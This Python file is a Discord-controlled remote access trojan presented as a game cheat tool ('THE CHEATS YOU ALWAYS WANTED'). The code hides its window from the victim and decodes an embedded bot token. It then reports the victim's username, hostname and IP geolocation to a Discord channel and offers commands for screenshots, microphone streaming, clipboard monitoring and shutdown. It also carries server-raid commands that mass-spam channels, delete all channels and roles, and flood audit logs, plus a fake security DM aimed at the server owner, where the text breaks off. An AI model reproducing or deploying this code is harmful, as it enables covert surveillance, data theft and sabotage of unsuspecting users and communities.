import os
import platform
if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

from colorama import Fore, Style
import time
time.sleep(1)
ASCII = """





                            ╔══════════════════════════════════════════════════════════════╗
                            ║                                                              ║
                            ║            ██████╗ ███████╗██╗  ████████╗ ██████╗            ║
                            ║            ██╔══██╗██╔════╝██║  ╚══██╔══╝██╔═══██╗           ║
                            ║            ██║  ██║█████╗  ██║     ██║   ██║   ██║           ║
                            ║            ██║  ██║██╔══╝  ██║     ██║   ██║   ██║           ║
                            ║            ██████╔╝███████╗███████╗██║   ╚██████╔╝           ║
                            ║            ╚═════╝ ╚══════╝╚══════╝╚═╝    ╚═════╝            ║
                            ║            ███╗   ███╗ █████╗ ██████╗ ███████╗               ║
                            ║            ████╗ ████║██╔══██╗██╔══██╗╚══███╔╝               ║
                            ║            ██╔████╔██║███████║██║  ██║  ███╔╝                ║
                            ║            ██║╚██╔╝██║██╔══██║██║  ██║ ███╔╝                 ║
                            ║            ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗               ║
                            ║            ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝               ║
                            ║                                                              ║
                            ╚══════════════════════════════════════════════════════════════╝
                    ╔══════════════════════════════╗                                    ╔══════════╗
                    ║ THE CHEATS YOU ALWAYS WANTED ║                                    ║ by Delto ║
                    ╚══════════════════════════════╝                                    ╚══════════╝



"""
print(Fore.GREEN + ASCII + Style.RESET_ALL)
print(f'{Fore.LIGHTBLACK_EX}{Style.DIM}', end='')
time.sleep(5)

DEV = "tilov"

import win32gui
import win32con
import os

if not os.getlogin() == DEV:
    the_program_to_hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
else: print("skipping exit")

################################################################################

import binascii

def xor_encrypt_decrypt(data, key):
    key = (key * (len(data) // len(key) + 1))[:len(data)]
    return bytearray(a ^ b for a, b in zip(data, key.encode()))

# Encrypted hex string and key
hex_string = "1d353a433a3b3f411e2514413a053b031e3526403a3b37031d065d34005e4313634f1922343d11332322323e3a2e1e1515382b3a390227010a073014231a362c0a281c4442361f3d"
key = "Passwort"

# Convert hex string to bytes
encrypted_data = binascii.unhexlify(hex_string)

# Decrypt the data
decrypted_data = xor_encrypt_decrypt(encrypted_data, key).decode('utf-8')
TOKEN = decrypted_data

################################################################################

current_directory = os.getcwd()

import discord
import discord.ext
from discord.ext import commands, tasks
import platform
import subprocess
import os
import requests
import sys
from PIL import ImageGrab
import asyncio
import keyboard  # Keyboard library for keylogging
from pynput.keyboard import Listener  # Listener from pynput for global keylogging
import winreg
import pyaudio
import sounddevice as sd
import numpy as np
import threading
from gtts import gTTS
from io import BytesIO
import pyttsx3
import pyperclip
import multiprocessing
import tempfile
import cv2
import io
import aiohttp
import random
import difflib
from typing import Union
import ctypes
import pymsgbox
from datetime import datetime
import ctypes
import ctypes.wintypes
import time
import inspect

# Define global variables
notification_sent = False
loop_running = False  # Variable to track if the screenshot loop is running
# Globale Variable, um den vorherigen Clipboard-Inhalt zu speichern
clipboard_previous = None
# Globale Variable, um den Kanal für die Clipboard-Benachrichtigungen zu speichern
clipboard_channel = None
spamming_enabled = True  # Flag to track whether spamming is enabled
# Globale Variable zur Referenzierung des Popup-Fensters
popup_window = None
popup_root = None
close_button_window = None
popup_thread = None

cwd = os.getcwd()

# Define intents
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
intents.members = True
intents.messages = True
intents.guilds = True
intents.bans = True
intents.emojis = True
intents.integrations = True
intents.webhooks = True
intents.invites = True
intents.presences = True
intents.typing = True

# Create the bot with intents
bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
slash = discord.app_commands.CommandTree(client)

# Buffer to store keylog data
keylog_buffer = []

# Callback function for key press events
def on_press(key):
    try:
        # Add the pressed key to the buffer
        keylog_buffer.append(key.char)
    except AttributeError:
        # Special keys (e.g., Shift, Enter) are stored as attributes, handle them separately
        keylog_buffer.append(str(key))

# Function to send keylog data to bot
async def send_keylog_data(ctx):
    if keylog_buffer:
        keylog_data = '\n'.join(keylog_buffer)
        await ctx.send(f"Keylog data:\n```{keylog_data}```")
    else:
        await ctx.send("No keylog data available.")

# Funktion zum Senden einer eingebetteten Nachricht
async def send_embed(ctx, message):
    embed = discord.Embed(description=message, color=discord.Color.blue())
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    global notification_sent
    global clipboard_channel

    print(f'We have logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

    if not notification_sent:
        guild = bot.guilds[0]  # Get the first guild the bot is connected to

        # Das spezifizierte Mitglied und den Bot abrufen
        member = guild.get_member(691670319248965694)
        bot_member = guild.me

        print(f"Spezifiziertes Mitglied: {member}")
        print(f"Bot Mitglied: {bot_member}")

        response = requests.get('http://ip-api.com/json/')

        if not os.getlogin() == DEV:
            response = requests.get('http://ip-api.com/json/')
            if response.status_code == 200:
                geolocation_data = response.json()
                IPloc = f"# Geolocation Data:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
            else:
                IPloc = "Error retrieving geolocation data."
            running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME')}\n{IPloc}\n-----"
        else: running = "Bot is ready and running!"

        # Kanal erstellen und Berechtigungen setzen
        user_channel_name = os.getlogin()
        existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
        if not existing_channel:
            # Create a new channel if it doesn't exist
            try:
                clipboard_channel = await guild.create_text_channel(name=user_channel_name)
                if member:
                    await clipboard_channel.set_permissions(member, read_messages=True, send_messages=True)
                    print(f"Permissions für {member} erfolgreich gesetzt.")
                await clipboard_channel.send(running)
                print("Clipboard Channel erstellt und Nachricht gesendet.")
            except discord.Forbidden:
                print("Der Bot hat nicht die erforderlichen Berechtigungen, um Kanäle zu erstellen oder Berechtigungen festzulegen.")
        else:
            clipboard_channel = existing_channel
            await clipboard_channel.send(running)
            print("Vorhandener Clipboard Channel gefunden und Nachricht gesendet.")

        notification_sent = True

        # Setze die Aktivität des Bots
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='Flint'))
        print("Aktivität des Bots gesetzt.")

        # Setze den Status des Bots auf offline
        await bot.change_presence(status=discord.Status.offline)
        print("Bot Status auf offline gesetzt.")

        # Starte den Hintergrundprozess zur Überwachung des Clipboards
        bot.loop.create_task(monitor_clipboard())
        print("Clipboard Überwachungsprozess gestartet.")

        # Überprüfen, ob die Rolle bereits existiert
        existing_role = discord.utils.get(guild.roles, name="BOT_perms")
        if not existing_role:
            # Rolle erstellen, wenn sie noch nicht existiert
            try:
                role = await guild.create_role(name="BOT_perms", permissions=discord.Permissions.all())
                print("Rolle 'BOT_perms' erstellt.")
            except Exception as e:
                print(f"Fehler beim Erstellen der Rolle: {e}")
        else:
            role = existing_role
            print("Rolle 'BOT_perms' gefunden.")

        if role is None:
            print("Die Rolle 'BOT_perms' wurde nicht erstellt.")
            return  # Beende die Funktion, da die Rolle nicht erstellt wurde.

        # Rolle dem spezifizierten Mitglied und dem Bot zuweisen, wenn das Mitglied vorhanden ist
        if member:
            try:
                await member.add_roles(role)
                print(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
            except Exception as e:
                print(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")

        # Rolle dem Bot zuweisen, wenn der Bot-Mitglied vorhanden ist
        if bot_member:
            try:
                await bot_member.add_roles(role)
                print(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
            except Exception as e:
                print(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")

    if not os.getlogin() == DEV:
        await on(clipboard_channel)

################################################################################

@bot.event
async def on_message(message):
    if message.author == bot.user:
        await message.add_reaction("❌")  # Add "❌" reaction to all messages sent by the bot
        return

    if message.channel.name != os.getlogin():
        return

    if message.content.startswith(bot.command_prefix):
        await handle_command(message)
    else:
        await bot.process_commands(message)

async def handle_command(message):
    # Befehl aus der Nachricht extrahieren
    content = message.content[len(bot.command_prefix):].split()
    if not content:
        await message.delete()  # Nachricht löschen, wenn sie nur das Präfix enthält
        return

    command = content[0]

    try:
        await message.delete()  # Nachricht löschen
    except discord.Forbidden:
        print("Bot does not have permission to delete messages.")
    except discord.HTTPException:
        print("Failed to delete message.")

    if command in [cmd.name for cmd in bot.commands]:
        ctx = await bot.get_context(message)
        await bot.invoke(ctx)
    else:
        await handle_invalid_command(message)

async def handle_invalid_command(message):
    await message.channel.send("Invalid command.")

async def handle_invalid_command(message):
    command_list = [cmd.name for cmd in bot.commands]
    closest_matches = difflib.get_close_matches(message.content.split()[0][1:], command_list)
    if closest_matches:
        suggestion = closest_matches[0]
        msg = await message.channel.send(f"Befehl nicht gefunden. Meintest du: `{suggestion}`?")
        await msg.add_reaction('✅')
        await msg.add_reaction('❌')

        def check(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '❌'] and reaction.message.id == msg.id

        try:
            reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
            if str(reaction.emoji) == '✅':
                await msg.delete()
                # Command ausführen
                ctx = await bot.get_context(message)
                new_message = ctx.message
                new_message.content = f"{bot.command_prefix}{suggestion}"
                await bot.process_commands(new_message)
            elif str(reaction.emoji) == '❌':
                await msg.delete()
        except asyncio.TimeoutError:
            await msg.delete()
    else:
        await message.channel.send("Befehl nicht gefunden.")

@bot.event
async def on_reaction_add(reaction, user):
    if user != bot.user and str(reaction.emoji) not in ['✅', '❌']:
        try:
            await reaction.remove(user)
        except discord.NotFound:
            print("Reaction or message not found.")
            return

    if user.id == 691670319248965694 and str(reaction.emoji) == '❌':
        if reaction.message.content.startswith("Befehl nicht gefunden. Meintest du:"):
            try:
                await reaction.message.delete()
            except discord.NotFound:
                print("Message already deleted.")
            return

    if user.id == 691670319248965694 and str(reaction.emoji) == '✅':
        if reaction.message.content.startswith("Befehl nicht gefunden. Meintest du:"):
            try:
                await reaction.message.delete()
            except discord.NotFound:
                print("Message already deleted.")
            # Führe den vorgeschlagenen Befehl aus
            suggestion = reaction.message.content.split('`')[1]
            ctx = await bot.get_context(reaction.message)
            new_message = ctx.message
            new_message.content = f"{bot.command_prefix}{suggestion}"
            await bot.process_commands(new_message)
            return

    # Lösche die Nachricht, wenn der Benutzer auf das X reagiert
    if user.id == 691670319248965694 and str(reaction.emoji) == '❌':
        try:
            await reaction.message.delete()
        except discord.NotFound:
            print("Message already deleted.")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
    elif isinstance(error, commands.CommandNotFound):
        pass  # Do nothing, let the handle_invalid_command function handle it
    else:
        await ctx.send(f"Ein Fehler ist aufgetreten: {error}")
        print(f"Ein Fehler ist aufgetreten: {error}")

################################################################################

@bot.command(help="Gets geolocation data based on IP")
async def geolocation(ctx):
    if not os.getlogin():
        response = requests.get('http://ip-api.com/json/')
        if response.status_code == 200:
            geolocation_data = response.json()
            message = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
            await send_embed_message(ctx.channel, message)
        else:
            await send_embed_message(ctx.channel, "Error retrieving geolocation data.")
    else: await send_embed_message(ctx.channel, "DU HURENSOHN")

@bot.command(help="Displays system specifications")
async def specs(ctx):
    system_specs = f"**System Specifications**:\n"
    system_specs += f"Platform: {platform.platform()}\n"
    system_specs += f"Processor: {platform.processor()}\n"
    system_specs += f"Operating System: {platform.system()} {platform.release()}\n"
    system_specs += f"Python Version: {platform.python_version()}\n"
    system_specs += f"Architecture: {platform.architecture()[0]}\n"
    system_specs += f"Logged-in User: {os.getlogin()}\n"

    await send_embed_message(ctx.channel, system_specs)

# Define a new command to retrieve devices from Device Manager
@bot.command(help="Displays devices from Device Manager")
async def devices(ctx):
    try:
        devices = get_device_list()
        if devices:
            formatted_devices = format_devices(devices)
            await send_devices_messages(ctx.channel, formatted_devices)
        else:
            await send_embed_message(ctx.channel, "No devices found.")
    except Exception as e:
        await send_embed_message(ctx.channel, f"Error retrieving devices: {str(e)}")

# Function to send devices in multiple messages
async def send_devices_messages(channel, devices):
    max_length = 2000
    current_length = 0
    current_message = ""
    for line in devices.split('\n'):
        if len(current_message) + len(line) + 1 > max_length:  # Check if adding line exceeds max length
            embed = discord.Embed(description=current_message, color=discord.Color.blue())
            await channel.send(embed=embed)
            current_message = ""
        current_message += line + '\n'
    if current_message:  # Send remaining message
        embed = discord.Embed(description=current_message, color=discord.Color.blue())
        await channel.send(embed=embed)

# Function to retrieve devices from Device Manager
def get_device_list():
    devices = []

    # Get the devices from the registry
    try:
        import winreg as reg

        # Open the registry key for Enum
        enum_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum', 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)

        # Iterate over subkeys
        for category in iter_subkeys(enum_key):
            category_path = rf'SYSTEM\CurrentControlSet\Enum\{category}'
            category_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, category_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)

            # Iterate over subcategories
            for subcategory in iter_subkeys(category_key):
                subcategory_path = rf'SYSTEM\CurrentControlSet\Enum\{category}\{subcategory}'
                subcategory_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, subcategory_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)

                # Get the device names
                device_names = []
                try:
                    i = 0
                    while True:
                        device_name = reg.EnumKey(subcategory_key, i)
                        device_names.append(device_name)
                        i += 1
                except OSError:
                    pass

                # Append the category and device names to the devices list
                devices.append((category, device_names))

    except Exception as e:
        print(f"Error retrieving devices: {e}")

    return devices

# Helper function to iterate over subkeys
def iter_subkeys(key):
    i = 0
    while True:
        try:
            subkey_name = winreg.EnumKey(key, i)
            yield subkey_name
            i += 1
        except WindowsError as e:
            break

# Function to format devices for display
def format_devices(devices):
    formatted_devices = []
    for device in devices:
        if isinstance(device, tuple):
            category, subcategories = device
            subcategories_formatted = ', '.join(subcategories)
            formatted_devices.append(f"{category}: {subcategories_formatted}")
        else:
            formatted_devices.append(device)
    return '\n'.join(formatted_devices)

# Change the default help command
@bot.command(help="Displays this message")
async def help(ctx, category: str = None):
    embed_pages = []
    hidden_commands = {"url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle

    if category == "hidden":
        commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
    else:
        commands = sorted([command for command in bot.commands if command.name != "help" and command.name not in hidden_commands], key=lambda x: x.name)

    chunks = [commands[i:i + 20] for i in range(0, len(commands), 20)]
    total_commands = len(commands)

    for idx, chunk in enumerate(chunks, 1):
        embed = discord.Embed(
            title="Command List",
            description="A list of available commands.",
            color=discord.Color.blue()
        )
        for command in chunk:
            embed.add_field(name=f">{command.name}", value=command.help, inline=False)
        embed.set_footer(text=f"Total commands: {total_commands}\nPage {idx}/{len(chunks)}")
        embed_pages.append(embed)

    current_page = 0
    message = await ctx.send(embed=embed_pages[current_page])

    async def paginate(reaction, user):
        nonlocal current_page
        if user == ctx.author:
            if str(reaction.emoji) == "◀️" and current_page > 0:
                current_page -= 1
                await message.edit(embed=embed_pages[current_page])
            elif str(reaction.emoji) == "▶️" and current_page < len(embed_pages) - 1:
                current_page += 1
                await message.edit(embed=embed_pages[current_page])

            try:
                await message.remove_reaction(reaction.emoji, user)
            except discord.NotFound:
                print("Message already deleted.")

    def check_reaction(reaction, user):
        return user == ctx.author and str(reaction.emoji) == '❌' and reaction.message.id == message.id

    await message.add_reaction("◀️")
    await message.add_reaction("▶️")
    await message.add_reaction("❌")

    bot.add_listener(paginate, "on_reaction_add")

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=300.0, check=check_reaction)
        if str(reaction.emoji) == '❌':
            await message.delete()
    except asyncio.TimeoutError:
        await message.clear_reactions()

@bot.command(help="Restarts the PC")
async def restart(ctx):
    await send_embed_message(ctx.channel, "Restarting the PC...")
    if platform.system() == "Windows":
        subprocess.run(["shutdown", "/r", "/t", "1"], shell=True)
    else:
        subprocess.run(["sudo", "reboot"], shell=True)

@bot.command(help="Shuts down the PC")
async def shutdown(ctx):
    await send_embed_message(ctx.channel, "Shutting down the PC...")
    if platform.system() == "Windows":
        subprocess.run(["shutdown", "/s", "/t", "1"], shell=True)
    else:
        subprocess.run(["sudo", "shutdown", "-h", "now"], shell=True)

# Define a command to reload the script
@bot.command(help="Reloads the bot script")
async def reload(ctx):
    global current_directory
    await send_embed_message(ctx.channel, "Reloading the script...")

    # Speichere das aktuelle Verzeichnis
    saved_directory = current_directory

    # Wechsle in das ursprüngliche Verzeichnis zurück
    os.chdir(saved_directory)

    # Neuladen des Skripts
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.command(help="Unloads the bot script")
async def eject(ctx):
    global clipboard_channel
    try:
        if clipboard_channel:
            await clipboard_channel.delete(reason="Bot is unloading.")
    except Exception as e:
        print(f"An error occurred while unloading the script: {e}")
    finally:
        await bot.close()  # Schließt den Bot-Client korrekt
        sys.exit(0)  # Beendet das Skript-Fenster ohne Fehlermeldung

# Define a test command
@bot.command(help="Creates a role, a text channel, a voice channel, and a category named 'w'")
async def test(ctx):
    try:
        # Rolle erstellen asynchron
        role_name = "w"
        role = await ctx.guild.create_role(name=role_name)
        await ctx.send("Role created: w")

        # Textkanal erstellen
        text_channel = await ctx.guild.create_text_channel(name="w")
        await ctx.send("Text channel created: w")

        # Sprachkanal erstellen
        voice_channel = await ctx.guild.create_voice_channel(name="w")
        await ctx.send("Voice channel created: w")

        # Kategorie erstellen
        category = await ctx.guild.create_category_channel(name="w")
        await ctx.send("Category created: w")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

# Define a command to take a screenshot
@bot.command(help="Takes a screenshot")
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
        all_screens = ImageGrab.grab(all_screens=True)
        all_screens.save(tmp_file.name)
        await ctx.send(file=discord.File(tmp_file.name))

# Define a command to start the screenshot loop
@bot.command(help="Starts a screenshot loop")
async def screenstart(ctx):
    global loop_running
    if loop_running:
        await ctx.send("Screenshot loop is already running.")
        return
    loop_running = True
    await ctx.send("@here Starting screenshot loop...")
    while loop_running:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
            all_screens = ImageGrab.grab(all_screens=True)
            all_screens.save(tmp_file.name)
            await ctx.send(file=discord.File(tmp_file.name))
        await asyncio.sleep(20)  # Wait for 20 seconds before taking the next screenshot

# Define a command to stop the screenshot loop
@bot.command(help="Stops the screenshot loop")
async def screenstop(ctx):
    global loop_running
    if not loop_running:
        await ctx.send("Screenshot loop is not running.")
        return
    loop_running = False
    await ctx.send("Screenshot loop stopped.")

# Function to send a message in embed format
async def send_embed_message(channel, content):
    embed = discord.Embed(description=content, color=discord.Color.blue())
    await channel.send(embed=embed)

# Funktion zum kontinuierlichen Senden von Audio
async def send_audio_background(stream, voice_client, stop_event):
    CHUNK = 2048
    loop = asyncio.get_event_loop()

    while not voice_client.is_connected():
        await asyncio.sleep(0.1)  # Warte, bis die Verbindung aufgebaut ist

    while not stop_event.is_set():
        try:
            data = await loop.run_in_executor(None, stream.read, CHUNK)
            if voice_client.is_connected():
                voice_client.send_audio_packet(data)
            else:
                break
        except Exception as e:
            print(f"Fehler beim Senden von Audio: {e}")
            break

# Funktion zum Übertragen von Mikrofon-Audio
async def play_microphone(ctx):
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 100000  # Abtastrate auf den Standardwert ändern
    CHUNK = 100000
    p = pyaudio.PyAudio()
    stream = None  # Initialisiere die Variable stream

    stop_event = asyncio.Event()

    try:
        user_channel_name = os.getlogin()
        guild = ctx.guild
        voice_channel = discord.utils.get(guild.voice_channels, name=user_channel_name)

        if voice_channel is None:
            await guild.create_voice_channel(name=user_channel_name)

        voice_client = await voice_channel.connect()

        # Öffne das Mikrofon und starte das Streaming
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        # Starte die Hintergrund-Übertragung von Audio in einem separaten Task
        audio_task = asyncio.create_task(send_audio_background(stream, voice_client, stop_event))

        # Warte darauf, dass der Nutzer den Befehl zum Stoppen gibt
        await ctx.send("Audio-Übertragung gestartet. Verwenden Sie >leavevoice, um die Übertragung zu beenden.")

        # Überwachung auf den Befehl zum Stoppen der Audio-Übertragung
        while True:
            await asyncio.sleep(1)

    except Exception as e:
        await ctx.send(f"Fehler bei der Audio-Übertragung: {e}")

    finally:
        # Stelle sicher, dass das Stream-Objekt ordnungsgemäß geschlossen wird
        if stream is not None and stream.is_active():
            stream.stop_stream()
            stream.close()
        # Beende den PyAudio-Stream
        p.terminate()

        # Trenne die Verbindung vom Sprachkanal
        if ctx.voice_client.is_connected():
            await ctx.voice_client.disconnect()

# Define a command to join a voice channel and stream microphone audio
@bot.command(help="Joins the voice channel and streams microphone audio")
async def joinvoice(ctx):
    await play_microphone(ctx)

# Define a command to leave the voice channel
@bot.command(help="Leaves the voice channel")
async def leavevoice(ctx):
    if ctx.voice_client is None:
        await ctx.send("I am not connected to a voice channel.")
        return

    await ctx.send("Audio-Übertragung beendet.")
    await ctx.voice_client.disconnect()

@bot.command(help="Creates 100 channels and sends @everyone message in each channel")
async def spam(ctx):
    async def create_channels_and_spam():
        async def create_channel_and_spam(i):
            channel = await ctx.guild.create_text_channel(name=f"raided-by-heidi-{i}")
            for _ in range(100):
                await asyncio.sleep(5)  # Warte 1 Sekunde zwischen den Nachrichten
                await channel.send("@everyone You just got raided by Heidi!")

        tasks = [create_channel_and_spam(i) for i in range(1, 101)]
        await asyncio.gather(*tasks)

    await create_channels_and_spam()
    await ctx.send("Spamming complete.")

@bot.command(help="Deletes all spam channels")
async def delspam(ctx):
    async def delete_channel(channel):
        await channel.delete()

    tasks = [delete_channel(channel) for channel in ctx.guild.channels if channel.name.startswith("raided-by-heidi-")]
    await asyncio.gather(*tasks)
    await ctx.send("All spam channels deleted.")

@bot.command(help="Deletes all channels, roles, emojis, stickers, and soundboards except for specified roles and user's channel")
async def delall(ctx):
    dope_role = discord.utils.get(ctx.guild.roles, name="DOPE ROLE")
    Mee9_role = discord.utils.get(ctx.guild.roles, name="Mee9")
    draht_role = discord.utils.get(ctx.guild.roles, name="DRAHT")
    perms_role = discord.utils.get(ctx.guild.roles, name="BOT_perms")
    noban_role = discord.utils.get(ctx.guild.roles, name="nobanana")
    everyone_role = ctx.guild.default_role
    bot_role = ctx.guild.me.top_role

    print("Gefundene Rollen:")
    print(dope_role)
    print(Mee9_role)
    print(draht_role)
    print(everyone_role)
    print(perms_role)
    print(noban_role)
    print(f"Bot-Rolle: {bot_role}")

    user_channel_name = os.getlogin()

    async def delete_item(item):
        if isinstance(item, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
            if item.name != user_channel_name and item.name != "nudel":  # Skip the channel named "nudel"
                print(f"Lösche Kanal/Kategorie: {item.name}")
                await item.delete()
        elif isinstance(item, discord.Role):
            print(f"Überprüfe Rolle: {item.name}")
            if item in [dope_role, Mee9_role, draht_role, everyone_role, bot_role, perms_role, noban_role]:
                print(f"Überspringe Rolle: {item.name}")
                return
            if item.position >= bot_role.position:
                print(f"Überspringe Rolle: {item.name} (über der Bot-Rolle)")
                return
            print(f"Lösche Rolle: {item.name}")
            await item.delete()
        elif isinstance(item, discord.Emoji):
            print(f"Lösche Emoji: {item.name}")
            await item.delete()
        elif isinstance(item, discord.GuildSticker):
            print(f"Lösche Sticker: {item.name}")
            await item.delete()
        elif isinstance(item, discord.VoiceClient):
            if hasattr(item, 'soundboard_sounds'):
                for soundboard_sound in item.soundboard_sounds:
                    print(f"Lösche Soundboard-Sound: {soundboard_sound.name}")
                    await soundboard_sound.delete()

    items_to_delete = ctx.guild.channels + ctx.guild.roles + list(ctx.guild.emojis) + list(ctx.guild.stickers)

    # Durchlaufe alle Voice-Channels und füge Voice-Clients zur Liste der zu löschenden Elemente hinzu
    for vc in ctx.guild.voice_channels:
        if vc.guild.voice_client:
            items_to_delete.append(vc.guild.voice_client)

    print("Zu löschende Elemente:")
    print(items_to_delete)

    tasks = [delete_item(item) for item in items_to_delete]

    await asyncio.gather(*tasks)

@bot.command(help= "Set every channel as nsfw")
async def nsfw(ctx):
    # Überprüfe, ob der Autor des Befehls Administratorberechtigungen hat
    if ctx.author.guild_permissions.administrator:
        # Iteriere durch alle Kanäle auf dem Server
        for channel in ctx.guild.channels:
            try:
                # Versuche, den Kanal in einen NSFW-Kanal zu ändern
                await channel.edit(nsfw=True)
                print(f"Der Kanal {channel.name} wurde zu einem NSFW-Kanal geändert.")
            except Exception as e:
                # Falls eine Ausnahme auftritt (z. B. fehlende Berechtigungen), gebe eine Fehlermeldung aus
                print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
        await ctx.send("Alle Kanäle wurden zu NSFW-Kanälen geändert.")
    else:
        # Falls der Autor des Befehls keine Administratorberechtigungen hat, sende eine Fehlermeldung
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

@bot.command(help= "Set every channel as non nsfw")
async def unnsfw(ctx):
    # Überprüfe, ob der Autor des Befehls Administratorberechtigungen hat
    if ctx.author.guild_permissions.administrator:
        # Iteriere durch alle Kanäle auf dem Server
        for channel in ctx.guild.channels:
            try:
                # Überprüfe, ob der Kanal NSFW ist, und ändere ihn dann zu einem normalen Kanal
                if channel.is_nsfw():
                    await channel.edit(nsfw=False)
                    print(f"Der NSFW-Kanal {channel.name} wurde zu einem normalen Kanal geändert.")
            except Exception as e:
                # Falls eine Ausnahme auftritt (z. B. fehlende Berechtigungen), gebe eine Fehlermeldung aus
                print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
        await ctx.send("Alle NSFW-Kanäle wurden in normale Kanäle geändert.")
    else:
        # Falls der Autor des Befehls keine Administratorberechtigungen hat, sende eine Fehlermeldung
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

@bot.command(help="Deletes all soundboards")
async def delsound(ctx):
    # Überprüfe, ob der Bot Administratorrechte hat
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("Der Bot benötigt Administratorberechtigungen, um Soundboards zu löschen.")
        return

    # Hole alle verfügbaren Guild-Features
    guild_features = ctx.guild.features

    # Überprüfe, ob Soundboards vorhanden sind
    if "DISCOVERABLE" in guild_features:
        await ctx.send("Soundboards können nicht direkt über die API gelöscht werden.")
        await ctx.send("Bitte entfernen Sie die Soundboards manuell über die Discord-Benutzeroberfläche.")
        return
    else:
        await ctx.send("Es wurden keine Soundboards gefunden, die gelöscht werden könnten.")
        return

@bot.command(help= "Check the bot permissions")
async def check_perms(ctx):
    if ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("Bot has permission to manage channels.")
    else:
        await ctx.send("Bot does not have permission to manage channels.")

    if ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("Bot has permission to manage roles.")
    else:
        await ctx.send("Bot does not have permission to manage roles.")

@bot.command(help="Renames the server")
async def reguild(ctx, *name):
    new_name = ' '.join(name)
    await ctx.guild.edit(name=new_name)
    await ctx.send(f"Server name changed to: {new_name}")


@bot.command(help="Changes the server's icon")
async def repic(ctx, url: str = None):
    if url is None and len(ctx.message.attachments) == 0:
        await ctx.send("No image attached or URL provided. Please attach an image file or provide a URL.")
        return

    if url:
        # Check if the URL points to an image
        if not (url.endswith(('.png', '.jpg', '.jpeg', '.gif')) or 'cdn.discordapp.com' in url):
            await ctx.send("Unsupported file format or URL. Please provide a direct link to an image file or use a valid Discord CDN link.")
            return

        # If it's a Discord CDN link, no need to download
        if 'cdn.discordapp.com' in url:
            data = requests.get(url).content
        else:
            # Download the image data from the URL
            try:
                response = requests.get(url)
                response.raise_for_status()
                data = response.content
            except Exception as e:
                await ctx.send("Failed to download the image from the provided URL. Please check the URL and try again.")
                return
    else:
        attachment = ctx.message.attachments[0]
        # Check if the attached file is an image
        if attachment.content_type.startswith('image'):
            # Download the image data
            data = await attachment.read()
        else:
            await ctx.send("Unsupported file format. Please attach an image file or provide a direct link to an image file.")
            return

    # Change server icon
    try:
        await ctx.guild.edit(icon=data)
        await ctx.send("Server icon changed successfully.")
    except Exception as e:
        await ctx.send("Failed to change server icon. Please make sure the bot has the necessary permissions.")

@bot.command(help="Spams the audit log by creating and deleting roles")
async def auditspam(ctx):
    role_name = "raided by Heidi"

    for _ in range(100):  # Perform the create/delete action 100 times
        role = await ctx.guild.create_role(name=role_name)
        await asyncio.sleep(0.1)  # Slight delay to ensure actions are logged
        await role.delete()
        await asyncio.sleep(0.1)  # Slight delay to ensure actions are logged

    await ctx.send("Audit log spammed with role create/delete actions 100 times.")

@bot.command(help="Sends a fake security DM to the server owner")
async def fakedm(ctx):
    owner = ctx.guild.owner
    if owner:
        try:
            embed = discord.Embed(
                title="🚨 Security Alert 🚨",
                description=(
                    "Hello, I'm a security bot monitoring your server.\n\n"
                    "🔴 **Urgent Issue Detected** 🔴\n\n"
